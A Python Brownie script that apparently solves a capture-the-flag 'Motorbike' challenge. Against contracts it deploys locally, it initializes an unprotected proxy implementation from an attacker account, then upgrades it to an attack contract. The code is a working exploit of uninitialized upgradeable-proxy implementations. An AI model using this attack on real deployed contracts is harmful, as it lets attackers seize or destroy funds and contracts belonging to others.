from brownie import network, Motorbike, Engine, Contract, BikeExy
from scripts.helpful import get_account, LOCAL_NETWORKS
import web3


def deploy_proxy(account, engine):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = Motorbike.deploy(
        engine.address,
        {"from": account.address},
        publish_source=publish,
    )
    print(
        f"Cotntract --Motorbike-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def deploy_contract(account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = Engine.deploy(
        {"from": account.address},
        publish_source=publish,
    )
    print(
        f"Cotntract --Engine-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def deploy_attack(account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = BikeExy.deploy(
        {"from": account.address},
        publish_source=publish,
    )
    print(
        f"Cotntract --BikeExy-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def encode_function_data(initializer=None, *args):
    """Encodes the function call so we can work with an initializer.
    Args:
        initializer ([brownie.network.contract.ContractTx], optional):
        The initializer function we want to call. Example: `box.store`.
        Defaults to None.
        args (Any, optional):
        The arguments to pass to the initializer function
    Returns:
        [bytes]: Return the encoded bytes.
    """
    if not len(args):
        args = b""

    if initializer:
        return initializer.encode_input(*args)

    return b""


def get_slots(contract, pos):
    w3 = web3.Web3(web3.HTTPProvider("http://127.0.0.1:8545"))
    print("---------------- Slot Layout ----------------")
    print(f"Contract address: {contract.address}")
    for i in pos:
        slot_value = w3.eth.getStorageAt(contract.address, i).hex()
        print(f"Slot: {i}, Value: {slot_value}")
    print("-----------------------End Layout-----------------------")


def print_status(proxy):
    w3 = web3.Web3(web3.HTTPProvider("http://127.0.0.1:8545"))
    print("------------------- Status -------------------")
    stloc = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
    implloc = w3.eth.getStorageAt(proxy.address, stloc)
    # print()
    # impaddr = implloc.replace("000000000000000000000000", "")
    print(f"Engine impl at: {implloc.hex()}")
    print(f"impl code:{w3.eth.get_code(implloc).hex()[:32]}")
    print("-------------------- END --------------------")


def main():
    owner_account = get_account(0)
    attacker_account = get_account(1)
    contract_engine = deploy_contract(owner_account)
    proxy = deploy_proxy(owner_account, contract_engine)
    proxy_motobike = Contract.from_abi("Engine", proxy.address, Engine.abi)
    print("Request greeting: ")
    tx = proxy_motobike.greetMe({"from": owner_account.address})
    tx.wait(1)
    print(tx.info())
    print_status(proxy_motobike)
    tx = contract_engine.initialize({"from": attacker_account.address})
    tx.wait(1)
    contract_broken_engine = deploy_attack(attacker_account)
    enc_init = encode_function_data(contract_engine.initialize)
    tx = contract_engine.upgradeToAndCall(
        contract_broken_engine.address, enc_init, {"from": attacker_account.address}
    )
    tx.wait(1)
    print_status(proxy_motobike)
    print("Request greeting: ")
    tx = proxy_motobike.greetMe({"from": owner_account.address})
    tx.wait(1)
    print(tx.info())


if __name__ == "__main__":
    main()
